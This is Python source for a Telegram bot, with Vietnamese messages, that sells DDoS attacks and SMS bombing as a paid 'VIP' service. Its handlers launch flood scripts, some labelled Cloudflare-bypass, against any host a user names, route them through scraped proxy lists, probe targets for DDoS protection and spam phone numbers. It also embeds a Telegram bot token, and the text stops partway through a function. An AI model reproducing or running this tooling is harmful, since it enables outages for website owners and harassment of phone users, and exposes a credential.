import telebot
import datetime
import time
import os
import subprocess
import psutil
import sqlite3
import hashlib
import requests
import sys
import socket
import zipfile
import io
import re
import threading
from concurrent.futures import ThreadPoolExecutor
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
from telebot import TeleBot
from bs4 import BeautifulSoup

bot_token = '6416387668:AAHpF_GbFYGYAJq2n-DWASg-9dmhaeaMWxo' 
bot = telebot.TeleBot(bot_token)

allowed_group_id = -1001943503176

allowed_users = []
processes = []
ADMIN_ID = 6482411283
proxy_update_count = 0
last_proxy_update_time = time.time()

connection = sqlite3.connect('user_data.db')
cursor = connection.cursor()

# Create the users table if it doesn't exist
cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        expiration_time TEXT
    )
''')
connection.commit()
def TimeStamp():
    now = str(datetime.date.today())
    return now
def load_users_from_database():
    cursor.execute('SELECT user_id, expiration_time FROM users')
    rows = cursor.fetchall()
    for row in rows:
        user_id = row[0]
        expiration_time = datetime.datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')
        if expiration_time > datetime.datetime.now():
            allowed_users.append(user_id)

def save_user_to_database(connection, user_id, expiration_time):
    cursor = connection.cursor()
    cursor.execute('''
        INSERT OR REPLACE INTO users (user_id, expiration_time)
        VALUES (?, ?)
    ''', (user_id, expiration_time.strftime('%Y-%m-%d %H:%M:%S')))
    connection.commit()
@bot.message_handler(commands=['add'])
def add_user(message):
    admin_id = message.from_user.id
    if admin_id != ADMIN_ID:
        bot.reply_to(message, 'Chỉ Dành Cho Admin')
        return

    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Nhập Đúng Định Dạng /add + [id]')
        return

    user_id = int(message.text.split()[1])
    allowed_users.append(user_id)
    expiration_time = datetime.datetime.now() + datetime.timedelta(days=30)
    connection = sqlite3.connect('user_data.db')
    save_user_to_database(connection, user_id, expiration_time)
    connection.close()

    bot.reply_to(message, f'Đã Thêm Người Dùng Có Id Là : {user_id} Sử Dụng Lệnh 30 Ngày')

load_users_from_database()

# Xử lý câu lệnh /thongbao
@bot.message_handler(commands=['thongbao'])
def thong_bao(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'Bạn Không Có Quyền Sử Dụng Lệnh Này.')
        return
        
    # Lấy nội dung từ tin nhắn
    message_text = message.text
    # Tách nội dung từ câu lệnh
    noi_dung = message_text.replace('/thongbao', '')  

    # Gửi thông báo đến kênh
    bot.send_message(-1001324470585, noi_dung)

@bot.message_handler(commands=['start', 'help'])
def help(message):
    help_text = '''
DANH SÁCH LỆNH CHO BOT !

━━━━━━━━━━━━━━━━━━━━

1️⃣ Lệnh DDoS ( Tấn Công Website )

- /attack + [methods] + [host] : DDoS Vip
- /methods : Để Xem Methods Vip

- /freeflood + [method] + [host] : DDoS Free
- /method : Để Xem Method Free

- /check + [host] : Kiểm Tra Anti DDoS
- /luuyddos : Xem Lưu Ý Khi DDoS

━━━━━━━━━━━━━━━━━━━━

2️⃣ Lệnh Spam Sms ( Free )

- /sms + [phone] + [time] : Spam Vip
- /luuyspam : Xem Lưu Ý Spam 
- /checkspam : Xem Số Lượng Spam

━━━━━━━━━━━━━━━━━━━━

3️⃣ Lệnh Lấy Code Website 

- /code + [host] : Lấy Code Html Của Website
- /js + [host] : Lấy Mã JavaScript Từ Website
- /css + [host] : Lấy Mã CSS Từ Website

━━━━━━━━━━━━━━━━━━━━

4️⃣ Lệnh Get Proxy 

- /getproxy : Get Proxy Auto Live
- /proxy : Check Số Lượng Proxy

- /freeproxy + [mode] : Lấy Danh Sách Proxy Free
- /mode : Xem Danh Sách Lựa Chọn

━━━━━━━━━━━━━━━━━━━━

5️⃣ Lệnh Dành Cho Admin

- /admin : Info Admin
- /cpu : Check Phần Trăm Cpu
- /time : Số Thời Gian Bot Hoạt Động

- /on : On Bot
- /off : Off Bot

- /add : Add Member Vip
- /thongbao : Gửi Thông Báo

- /ngocphong : Methods Flooder
- /phongvip : DDoS Flooder

━━━━━━━━━━━━━━━━━━━━
'''
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['methods'])
def methods(message):
    user_id = message.from_user.id
    if user_id not in allowed_users:
        bot.reply_to(message, text='Mua Vip Đi Bạn. Nhắn /admin Để Liên Hệ Admin Nhé.')
        return
        
    help_text = '''
Methods DDoS Vip :
	
- HTTP-BYPASS

- HTTP-TLS
	
- TLS-SUPER

- CLOUDFLARE-BYPASS

- DESTROY-VIP

- STORM-BYPASS

- HTTPS-XV

- TLS-FOREX
'''
    bot.reply_to(message, help_text)

allowed_users = []  # Define your allowed users list
cooldown_dict = {}
is_bot_active = True

def run_attack(command, duration, message):
    cmd_process = subprocess.Popen(command)
    start_time = time.time()
    
    while cmd_process.poll() is None:
        # Check CPU usage and terminate if it's too high for 10 seconds
        if psutil.cpu_percent(interval=1) >= 1:
            time_passed = time.time() - start_time
            if time_passed >= 120:
                cmd_process.terminate()
                bot.reply_to(message, "Đã Dừng Lệnh Tấn Công. Cảm Ơn Bạn Đã Sử Dụng.")
                return
        # Check if the attack duration has been reached
        if time.time() - start_time >= duration:
            cmd_process.terminate()
            cmd_process.wait()
            return

@bot.message_handler(commands=['attack'])
def attack_command(message):
    user_id = message.from_user.id
    if user_id not in allowed_users:
        bot.reply_to(message, text='Mua Vip Đi Bạn. Nhắn /admin Để Liên Hệ Admin Nhé.')
        return
        
    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot Hiện Đang Tắt. Vui Lòng Chờ Khi Nào Được Bật Lại.')
        return

    if len(message.text.split()) < 3:
        bot.reply_to(message, 'Vui Lòng Nhập Đúng Cú Pháp.\nVí Dụ : /attack + [method] + [host]')
        return

    username = message.from_user.username

    current_time = time.time()
    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 150:
        remaining_time = int(150 - (current_time - cooldown_dict[username].get('attack', 0)))
        bot.reply_to(message, f"@{username} Vui Lòng Đợi {remaining_time} Giây Trước Khi Sử Dụng Lại Lệnh /attack.")
        return
    
    args = message.text.split()
    method = args[1].upper()
    host = args[2]

    blocked_domains = [".edu", ".gov", ".gob", ".mil", "chinhphu.vn"]   
    if method == 'HTTP-BYPASS' or method == 'HTTP-TLS' or method == 'TLS-SUPER'  or method == 'CLOUDFLARE-BYPASS' or method == 'DESTROY-VIP' or method == 'STORM-BYPASS' or method == 'HTTPS-XV' or method == 'TLS-FOREX':
        for blocked_domain in blocked_domains:
            if blocked_domain in host:
                bot.reply_to(message, f"Không Được Phép Tấn Công Trang Web Có Tên Miền {blocked_domain}")
                return

    if method in ['HTTP-BYPASS', 'HTTP-TLS', 'TLS-SUPER', 'CLOUDFLARE-BYPASS', 'DESTROY-VIP', 'STORM-BYPASS', 'HTTPS-XV', 'TLS-FOREX']:
        # Update the command and duration based on the selected method
        if method == 'HTTP-BYPASS':
            command = ["node", "FLOOD.js", host, "90", "30", "5", "proxy.txt"]
            duration = 90
        if method == 'HTTP-TLS':
            command = ["node", "TLS.js", host, "90", "30", "5", "proxy.txt"]
            duration = 90
        if method == 'TLS-SUPER':
            command = ["node", "SUPER.js", host, "90", "30", "5", "proxy.txt", "GET"]
            duration = 90
        if method == 'CLOUDFLARE-BYPASS':
            command = ["node", "CF.js", host, "90", "5", "proxy.txt"]
            duration = 90
        if method == 'DESTROY-VIP':
            command = ["./httpdestroy", host, "90", "30", "5", "proxy.txt"]
            duration = 90
        if method == 'STORM-BYPASS':
            command = ["node", "STORM.js", "GET", host, "proxy.txt", "90", "30", "5"]
            duration = 90
        if method == 'HTTPS-XV':
            command = ["node", "XV.js", host, "90", "30", "5"]
            duration = 90
        if method == 'TLS-FOREX':
            command = ["node", "FOREX.js", host, "90", "30", "5", "proxy.txt"]
            duration = 90

        cooldown_dict[username] = {'attack': current_time}

        attack_thread = threading.Thread(target=run_attack, args=(command, duration, message))
        attack_thread.start()
        bot.reply_to(message, f' 👾 𝑨𝒕𝒕𝒂𝒄𝒌 𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝑺𝒆𝒏𝒅 👾\n\nAttack By : @{username} \nHost : {host} \nMethods : {method} \nTime : {duration} Giây \nAdmin : @onnichanvip')
    else:
        bot.reply_to(message, 'Phương Thức Tấn Công Không Hợp Lệ. Sử Dụng Lệnh /methods Để Xem Phương Thức Tấn Công')

@bot.message_handler(commands=['cpu'])
def check_cpu(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'Bạn Không Có Quyền Sử Dụng Lệnh Này.')
        return

    cpu_usage = psutil.cpu_percent(interval=1)
    memory_usage = psutil.virtual_memory().percent

    bot.reply_to(message, f'Cpu Usage : {cpu_usage}%\nMemory Usage : {memory_usage}%')

@bot.message_handler(commands=['off'])
def turn_off(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'Bạn Không Có Quyền Sử Dụng Lệnh Này.')
        return

    global is_bot_active
    is_bot_active = False
    bot.reply_to(message, 'Bot Đã Được Tắt. Tất Cả Người Dùng Không Thể Sử Dụng Lệnh Khác.')

@bot.message_handler(commands=['on'])
def turn_on(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'Bạn Không Có Quyền Sử Dụng Lệnh Này.')
        return

    global is_bot_active
    is_bot_active = True
    bot.reply_to(message, 'Bot Đã Được Khởi Động Lại. Tất Cả Người Dùng Có Thể Sử Dụng Lại Lệnh Bình Thường.')

@bot.message_handler(commands=['check'])
def check_ip(message):
    user_id = message.from_user.id
    if user_id not in allowed_users:
        bot.reply_to(message, text='Mua Vip Đi Bạn. Nhắn /admin Để Liên Hệ Admin Nhé.')
        return
        
    if len(message.text.split()) != 2:
        bot.reply_to(message, 'Vui Lòng Nhập Đúng Cú Pháp.\nVí Dụ : /check + [link website]')
        return

    url = message.text.split()[1]
    
    # Kiểm tra xem URL có http/https chưa, nếu chưa thêm vào
    if not url.startswith(("http://", "https://")):
        url = "http://" + url

    # Loại bỏ tiền tố "www" nếu có
    url = re.sub(r'^(http://|https://)?(www\d?\.)?', '', url)
    
    try:
        ip_list = socket.gethostbyname_ex(url)[2]
        ip_count = len(ip_list)

        reply = f"Ip Của Website : {url}\nLà : {', '.join(ip_list)}\n"
        if ip_count == 1:
            reply += "Website Có 1 Ip Có Khả Năng Không Antiddos."
        else:
            reply += "Website Có Nhiều Hơn 1 Ip Khả Năng Antiddos Rất Cao.\nKhông Thể Tấn Công Website Này."

        bot.reply_to(message, reply)
    except Exception as e:
        bot.reply_to(message, f"Có Lỗi Xảy Ra : {str(e)}")

@bot.message_handler(commands=['admin'])
def send_admin_link(message):
    bot.reply_to(message, " vui lòng liên hệ admin tag\nLưu Ý : Không Có Admin Thứ Hai !")

is_bot_active = True
@bot.message_handler(commands=['code'])
def code(message):
    user_id = message.from_user.id
    if user_id not in allowed_users:
        bot.reply_to(message, text='Mua Vip Đi Bạn. Nhắn /admin Để Liên Hệ Admin Nhé.')
        return
        
    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot Hiện Đang Tắt. Vui Lòng Chờ Khi Nào Được Bật Lại.')
        return
    
    if len(message.text.split()) != 2:
        bot.reply_to(message, 'Vui Lòng Nhập Đúng Cú Pháp.\nVí Dụ : /code + [link website]')
        return

    url = message.text.split()[1]

    try:
        response = requests.get(url)
        if response.status_code != 200:
            bot.reply_to(message, 'Không Thể Lấy Mã Nguồn Từ Trang Web Này. Vui Lòng Kiểm Tra Lại Url.')
            return

        content_type = response.headers.get('content-type', '').split(';')[0]
        if content_type not in ['text/html', 'application/x-php', 'text/plain']:
            bot.reply_to(message, 'Trang Web Không Phải Là Html Hoặc Php. Vui Lòng Thử Với Url Trang Web Chứa File Html Hoặc Php.')
            return

        source_code = response.text

        zip_file = io.BytesIO()
        with zipfile.ZipFile(zip_file, 'w') as zipf:
            zipf.writestr("source_code.txt", source_code)

        zip_file.seek(0)
        bot.send_chat_action(message.chat.id, 'upload_document')
        bot.send_document(message.chat.id, zip_file)

    except Exception as e:
        bot.reply_to(message, f'Có Lỗi Xảy Ra : {str(e)}')

# Hàm tính thời gian hoạt động của bot
start_time = time.time()

proxy_update_count = 0
proxy_update_interval = 600

@bot.message_handler(commands=['getproxy'])
def get_proxy_info(message):
    user_id = message.from_user.id
    global proxy_update_count

    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'Bạn Không Có Quyền Sử Dụng Lệnh Này.')
        return

    if not is_bot_active:
        bot.reply_to(message, 'Bot Hiện Đang Tắt. Vui Lòng Chờ Khi Nào Được Bật Lại.')
        return

    def save_proxies_to_file(proxies):
        url = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all"
        response = requests.get(url)
        proxies = response.text.split('\r\n')[:-1]  # Loại bỏ phần tử cuối cùng (rỗng)

        with open("proxybyngocphong.txt", "w") as file:
            for proxy in proxies:
                file.write(proxy + "\n")

    save_proxies_to_file([])

    try:
        with open("proxybyngocphong.txt", "r") as proxy_file:
            proxy_list = proxy_file.readlines()
            proxy_list = [proxy.strip() for proxy in proxy_list]
            proxy_count = len(proxy_list)
            proxy_message = f'Số Lượng Proxy : {proxy_count}\n'
            bot.send_message(message.chat.id, proxy_message)
            bot.send_document(message.chat.id, open("proxybyngocphong.txt", "rb"))
            proxy_update_count += 1
    except FileNotFoundError:
        bot.reply_to(message, "Không Tìm Thấy File.")
        
@bot.message_handler(commands=['time'])
def show_uptime(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'Bạn Không Có Quyền Sử Dụng Lệnh Này.')
        return
        
    current_time = time.time()
    uptime = current_time - start_time
    hours = int(uptime // 3600)
    minutes = int((uptime % 3600) // 60)
    seconds = int(uptime % 60)
    uptime_str = f'{hours} Giờ {minutes} Phút {seconds} Giây'
    bot.reply_to(message, f'Bot Đã Hoạt Động Được : {uptime_str}')

def count_lines(file_path):
    with open(file_path, 'r') as file:
        lines = file.readlines()
        num_lines = len(lines)
    return num_lines

@bot.message_handler(commands=['proxy'])
def handle_countlines(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'Bạn Không Có Quyền Sử Dụng Lệnh Này.')
        return
        
    file_paths = {'proxy.txt': 'Số Proxy Trong File Là : '}
    
    reply_text = ""
    for file_path, file_description in file_paths.items():
        num_lines = count_lines(file_path)
        reply_text += f"{file_description} {num_lines}\n"
    
    bot.reply_to(message, text=reply_text)

@bot.message_handler(commands=['mode'])
def mode(message):
    if message.chat.type != 'group' and message.chat.type != 'supergroup':
        bot.reply_to(message, text='Bot Chỉ Hoạt Động Trong Nhóm : https://t.me/modvipchat')
        return

    help_text = '''
Danh Sách :

HTTP : GET PROXY HTTP

HTTPS : GET PROXY HTTPS

SOCKS4 : GET PROXY SOCKS4

SOCKS5 : GET PROXY SOCKS5

'''
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['freeproxy'])
def freeproxy(message):
    if message.chat.type != 'group' and message.chat.type != 'supergroup':
        bot.reply_to(message, text='Bot Chỉ Hoạt Động Trong Nhóm : https://t.me/+8fBPISIKcnUxMGY1')
        return
        
    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot Hiện Đang Tắt. Vui Lòng Chờ Khi Nào Được Bật Lại.')
        return
        
    args = message.text.split(" ")
    if len(args) != 2:
        bot.reply_to(message, "Vui Lòng Sử Dụng Theo Cú Pháp.\nVí Dụ : /freeproxy + [mode].")
        return
    
    proxy_type = args[1].upper()
    if proxy_type not in ['HTTP', 'HTTPS', 'SOCKS4', 'SOCKS5']:
        bot.reply_to(message, "Lựa Chọn Không Hợp Lệ. Nhắn /mode Để Xem Lựa Chọn.")
        return

    sources = {
        'HTTP': [
            'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http',
            'https://www.freeproxychecker.com/result/http_proxies.txt'
        ],
        'HTTPS': [
            'https://api.proxyscrape.com/v2/?request=getproxies&protocol=https',
            'https://www.freeproxychecker.com/result/https_proxies.txt'
        ],
        'SOCKS4': [
            'https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4'
        ],
        'SOCKS5': [
            'https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5'
        ]
    }

    proxies = []
    for source in sources.get(proxy_type, []):
        try:
            response = requests.get(source)
            if response.status_code == 200:
                proxies.extend(response.text.splitlines())
        except:
            pass

    if len(proxies) > 0:
        filename = 'freeproxy{}.txt'.format(proxy_type.lower())

        with open(filename, 'w') as file:
            file.write('\n'.join(proxies))

        bot.send_document(message.chat.id, open(filename, 'rb'))
        bot.reply_to(message, "Yêu Cầu Get Proxy {} Thành Công.\nĐã Gửi File {} Cho @{}".format(proxy_type, filename, message.from_user.username))
    else:
        bot.reply_to(message, "Không Thể Lấy Danh Sách Proxy Miễn Phí.")

@bot.message_handler(commands=['method'])
def method(message):
    help_text = '''
Methods DDoS Free :

- TLS-BYPASS

- HTTP-DESTROY

- HTTPS-BYPASS

- UAM-BYPASS

- TLS-FLOOD

- HTTP-FLOOD
'''
    bot.reply_to(message, help_text)

allowed_users = []  # Define your allowed users list
cooldown_dict = {}
is_bot_active = True

def run_attack(command, duration, message):
    cmd_process = subprocess.Popen(command)
    start_time = time.time()
    
    while cmd_process.poll() is None:
        # Check CPU usage and terminate if it's too high for 10 seconds
        if psutil.cpu_percent(interval=1) >= 1:
            time_passed = time.time() - start_time
            if time_passed >= 90:
                cmd_process.terminate()
                bot.reply_to(message, "Đã Dừng Lệnh Tấn Công. Cảm Ơn Bạn Đã Sử Dụng.")
                return
        # Check if the attack duration has been reached
        if time.time() - start_time >= duration:
            cmd_process.terminate()
            cmd_process.wait()
            return

@bot.message_handler(commands=['freeflood'])
def attack_command(message):
    if message.chat.type != 'group' and message.chat.type != 'supergroup':
        bot.reply_to(message, text='Bot Chỉ Hoạt Động Trong Nhóm : https://t.me/modvipchat')
        return
        
    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot Hiện Đang Tắt. Vui Lòng Chờ Khi Nào Được Bật Lại.')
        return

    if len(message.text.split()) < 3:
        bot.reply_to(message, 'Vui Lòng Nhập Đúng Cú Pháp.\nVí Dụ : /freeflood + [method] + [host]')
        return

    username = message.from_user.username

    current_time = time.time()
    if username in cooldown_dict and current_time - cooldown_dict[username].get('freeflood', 0) < 300:
        remaining_time = int(300 - (current_time - cooldown_dict[username].get('freeflood', 0)))
        bot.reply_to(message, f"@{username} Vui Lòng Đợi {remaining_time} Giây Trước Khi Sử Dụng Lại Lệnh /freeflood.")
        return
    
    args = message.text.split()
    method = args[1].upper()
    host = args[2]

    blocked_domains = [".edu", ".gov", ".gob", ".mil", "chinhphu.vn"]   
    if method == 'TLS-BYPASS' or method == 'HTTP-DESTROY' or method == 'HTTPS-BYPASS' or method == 'UAM-BYPASS' or method == 'TLS-FLOOD' or method == 'HTTP-FLOOD':
        for blocked_domain in blocked_domains:
            if blocked_domain in host:
                bot.reply_to(message, f"Không Được Phép Tấn Công Trang Web Có Tên Miền {blocked_domain}")
                return

    if method in ['TLS-BYPASS', 'HTTP-DESTROY', 'HTTPS-BYPASS', 'UAM-BYPASS', 'TLS-FLOOD', 'HTTP-FLOOD']:
        # Make a GET request to check the response code
        response = requests.get(host)
        if response.status_code == 200:
            # Update the command and duration based on the selected method
            if method == 'TLS-BYPASS':
                command = ["node", "TLS-BYPASS.js", host, "90", "30", "3"]
                duration = 90
            if method == 'HTTP-DESTROY':
                command = ["node", "HTTP-DESTROY.js", host, "90", "30", "3", "proxybyngocphong.txt"]
                duration = 90
            if method == 'HTTPS-BYPASS':
                command = ["node", "HTTPS-BYPASS.js", host, "90", "3", "proxybyngocphong.txt"]
                duration = 90
            if method == 'UAM-BYPASS':
                command = ["node", "UAM-BYPASS.js", host, "90", "30", "3", "proxybyngocphong.txt"]
                duration = 90
            if method == 'TLS-FLOOD':
                command = ["node", "TLS-FLOOD.js", host, "90", "30", "3", "proxybyngocphong.txt"]
                duration = 90
            if method == 'HTTP-FLOOD':
                command = ["node", "HTTP-FLOOD.js", host, "90"]
                duration = 90

            cooldown_dict[username] = {'freeflood': current_time}

            attack_thread = threading.Thread(target=run_attack, args=(command, duration, message))
            attack_thread.start()
            bot.reply_to(message, f'Attack By : @{username} \nHost : {host} \nMethods : {method} \nTime : {duration} Giây \nAdmin : @duongngocphong0311')
        else:
            bot.reply_to(message, 'Kết Nối Đến {} Thất Bại. Error Code {}'.format(host, response.status_code)) 
    else:
        bot.reply_to(message, 'Phương Thức Tấn Công Không Hợp Lệ.')

@bot.message_handler(commands=['luuyddos'])
def method(message):
    help_text = '''
Lưu Ý Trước Khi DDoS :
	
➡️ Không Tấn Công Các Trang Của Chính Phủ (.gov/.gob/chinhphu.vn)

➡️ Không Tấn Công Các Trang Giáo Dục (.edu)

➡️ Không Tấn Công Bộ Quốc Phòng Hoa Kỳ (.mil)

➡️ Check-Host Trước Khi DDoS ( Tránh Ddos Những Webs 403 Forbidden).

➡️ Stress DDoS Là 1 Công Cụ Kiểm Tra Sức Chịu Đựng, Bền Bỉ Của 1 Trang Website. 

➡️ Stress DDoS Dùng Để Kiểm Tra Website Của Bạn Hoặc Ai Đó Có Chịu Nổi Các Cuộc Tấn Công Hay Không ( Gây Tê Liệt Tạm Thời ).

➡️ Stress DDoS Luôn Luôn Tấn Công Chỉ Tính Theo Phút Và Giây.

➡️ Stress DDoS Không Phải Là Công Cụ Đánh Sập Website Vĩnh Viễn.
'''
    bot.reply_to(message, help_text)

### Danh Cho Admin ###

@bot.message_handler(commands=['ngocphong'])
def method(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'Bạn Không Có Quyền Sử Dụng Lệnh Này.')
        return

    help_text = '''
Methods DDoS :

- FLOODER-VIP

- FLOODER-V1

- TLS-PRIVATE

- HTTPS-SPAM

- SKYNET-TLS
'''
    bot.reply_to(message, help_text)

allowed_users = []  # Define your allowed users list
cooldown_dict = {}
is_bot_active = True

def run_phongvip(command, duration, message):
    cmd_process = subprocess.Popen(command)
    start_time = time.time()
    
    while cmd_process.poll() is None:
        # Check CPU usage and terminate if it's too high for 10 seconds
        if psutil.cpu_percent(interval=1) >= 1:
            time_passed = time.time() - start_time
            if time_passed >= 120:
                cmd_process.terminate()
                bot.reply_to(message, "Đã Dừng Lệnh Tấn Công.")
                return
        # Check if the phongvip duration has been reached
        if time.time() - start_time >= duration:
            cmd_process.terminate()
            cmd_process.wait()
            return

@bot.message_handler(commands=['phongvip'])
def phongvip_command(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'Bạn Không Có Quyền Sử Dụng Lệnh Này.')
        return
    
    if not is_bot_active:
        bot.reply_to(message, 'Bot Hiện Đang Tắt. Vui Lòng Chờ Khi Nào Được Bật Lại.')
        return

    if len(message.text.split()) < 3:
        bot.reply_to(message, 'Vui Lòng Nhập Đúng Cú Pháp.\nVí Dụ : /onnichanvip + [method] + [host]')
        return

    username = message.from_user.username

    current_time = time.time()
    if username in cooldown_dict and current_time - cooldown_dict[username].get('onnichanvip', 0) < 150:
        remaining_time = int(150 - (current_time - cooldown_dict[username].get('onnichanvip', 0)))
        bot.reply_to(message, f"@{username} Vui Lòng Đợi {remaining_time} Giây Trước Khi Sử Dụng Lại Lệnh.")
        return
    
    args = message.text.split()
    method = args[1].upper()
    host = args[2]

    blocked_domains = [".edu", ".gov", ".gob", ".mil", "chinhphu.vn"]   
    if method == 'FLOODER-VIP' or method == 'FLOODER-V1' or method == 'TLS-PRIVATE' or method == 'HTTPS-SPAM' or method == 'SKYNET-TLS':
        for blocked_domain in blocked_domains:
            if blocked_domain in host:
                bot.reply_to(message, f"Không Được Phép Tấn Công Trang Web Có Tên Miền {blocked_domain}")
                return

    if method in ['FLOODER-VIP', 'FLOODER-V1', 'TLS-PRIVATE', 'HTTPS-SPAM', 'SKYNET-TLS']:
        # Update the command and duration based on the selected method
        if method == 'FLOODER-VIP':
            command = ["node", "FLOODER-VIP.js", host, "120", "10", "admin.txt", "64", "1"]
            duration = 120
        if method == 'FLOODER-V1':
            command = ["node", "FLOODER-V1.js", host, "120", "64", "10", "admin.txt", "KEY_JS"]
            duration = 120
        if method == 'TLS-PRIVATE':
            command = ["node", "TLS-PRIVATE.js", host, "120", "64", "10", "admin.txt"]
            duration = 120
        if method == 'HTTPS-SPAM':
            command = ["node", "HTTPS-SPAM.js", host, "120", "64", "10", "admin.txt"]
            duration = 120
        if method == 'SKYNET-TLS':
            command = ["node", "SKYNET-TLS.js", host, "120", "64", "10", "admin.txt"]
            duration = 120
                
        cooldown_dict[username] = {'phongvip': current_time}

        phongvip_thread = threading.Thread(target=run_phongvip, args=(command, duration, message))
        phongvip_thread.start()
        
        bot.reply_to(message, f'👾 𝑨𝒕𝒕𝒂𝒄𝒌 𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝑺𝒆𝒏𝒅 👾\n\n[👑] 𝑨𝒕𝒕𝒂𝒄𝒌 𝑩𝒚 : @{username} \n[🌐] 𝑯𝒐𝒔𝒕 : {host} \n[🥀] 𝑴𝒆𝒕𝒉𝒐𝒅𝒔 : {method} \n[⏰] 𝑻𝒊𝒎𝒆 : {duration} 𝑮𝒊𝒂‌𝒚')
    else:
        bot.reply_to(message, 'Phương Thức Tấn Công Không Hợp Lệ.')
        
### Danh Cho Admin ###

@bot.message_handler(commands=['luuyspam'])
def method(message):
    help_text = '''
Lưu Ý Trước Khi Spam Sms :
	
➡️ Không Tấn Công Các Số Của Nhà Nước.

➡️ Không Tấn Công Các Số Của Giáo Dục.

➡️ Không Tấn Công Các Số Khẩn Cấp.

➡️ Không Tấn Công Các Số Nước Ngoài.

➡️ Spam Time Là 1 Đến 60 Phút.

➡️ Không Spam Sử Dụng Lệnh Quá Nhiều.

➡️ Sử Dụng Spam Với Mục Đích Hợp Lí.
'''
    bot.reply_to(message, help_text)
 
allowed_users = []  # Define your allowed users list
cooldown_dict = {}
is_bot_active = True

# Dictionary lưu trữ thông tin về số điện thoại đang bị spam
spam_numbers = {}

def run_sms(command, duration, message):
    cmd_process = subprocess.Popen(command)
    start_time = time.time()

    while cmd_process.poll() is None:
        # Check CPU usage and terminate if it's too high for 10 seconds
        if psutil.cpu_percent(interval=1) >= 1:
            time_passed = time.time() - start_time
            if time_passed >= 150:
                cmd_process.terminate()
                bot.reply_to(message, "Đã Dừng Lệnh Tấn Công. Cảm Ơn Bạn Đã Sử Dụng.")
                return
        # Check if the sms duration has been reached
        if time.time() - start_time >= duration:
            cmd_process.terminate()
            cmd_process.wait()
            return

@bot.message_handler(commands=['sms'])
def sms_command(message):
    if message.chat.type != 'group' and message.chat.type != 'supergroup':
        bot.reply_to(message, text='Bot Chỉ Hoạt Động Trong Nhóm : https://t.me/+8fBPISIKcnUxMGY1')
        return

    if not is_bot_active:
        bot.reply_to(message, 'Bot Hiện Đang Tắt. Vui Lòng Chờ Khi Nào Được Bật Lại.')
        return

    if len(message.text.split()) < 3:
        bot.reply_to(message, 'Vui Lòng Nhập Đúng Cú Pháp.\nVí Dụ : /sms + [phone] + [time]')
        return

    username = message.from_user.username
    current_time = time.time()
    if username in cooldown_dict and current_time - cooldown_dict[username].get('sms', 0) < 300:
        remaining_time = int(300 - (current_time - cooldown_dict[username].get('sms', 0)))
        bot.reply_to(message, f"@{username} Vui Lòng Đợi {remaining_time} Giây Trước Khi Sử Dụng Lại Lệnh.")
        return

    args = message.text.split()
    phone = args[1]
    duration = int(args[2])

    # Kiểm tra độ dài số điện thoại
    if len(phone) != 10:
        bot.reply_to(message, 'Số Điện Thoại Không Hợp Lệ.')
        return

    # Kiểm tra thời gian
    if duration <= 0 or duration >= 60:
        bot.reply_to(message, 'Thời Gian Không Hợp Lệ.\nVí Dụ : /sms 0123456789 10.')
        return

    # Kiểm tra nếu số điện thoại nằm trong danh sách số đã chặn
    blocked_numbers = ["111", "112", "113", "114", "115"]
    if phone in blocked_numbers:
        bot.reply_to(message, f"Không Được Phép Tấn Công Số Điện Thoại {phone}")
        return

    command = ["python", "SMS.py", phone, str(duration)]

    cooldown_dict[username] = {'sms': current_time}

    # Lưu thông tin số điện thoại bị spam
    spam_numbers[phone] = {'sender': username, 'time': duration}

    sms_thread = threading.Thread(target=run_sms, args=(command, duration, message))
    sms_thread.start()
    bot.reply_to(message, f'Spam By : @{username} \nPhone : {phone} \nTime : {duration} Phút \nApi : Update 60 - Vip \nAdmin : @onnichanvip')

@bot.message_handler(commands=['checkspam'])
def check_spam_command(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'Bạn Không Có Quyền Sử Dụng Lệnh Này.')
        return
        
    if len(spam_numbers) == 0:
        bot.reply_to(message, 'Hiện Tại Không Có Số Nào Đang Bị Spam.')
        return

    response = f"Có {len(spam_numbers)} Số Đang Bị Spam.\n\n"

    for number, info in spam_numbers.items():
        sender = info['sender']
        time = info['time']
        response += f"@{sender} Spam Đến {number} Với Time Là {time} Phút.\n"

    bot.reply_to(message, response)
    
def save_css_code(file_path, css_code):
    with open(file_path, "w") as file:
        file.write(css_code)

def get_css_code(url):
    response = requests.get(url)

    if response.status_code == 200:
        soup = BeautifulSoup(response.content, "html.parser")
        css_code = ""

        # Trích xuất mã CSS từ thẻ <style>
        style_tags = soup.find_all("style")
        for tag in style_tags:
            css_code += tag.string

        # Trích xuất mã CSS từ tập tin CSS bên ngoài
        link_tags = soup.find_all("link", rel="stylesheet")
        for tag in link_tags:
            css_url = tag.get("href")
            if css_url.startswith("/"):
                css_url = url + css_url
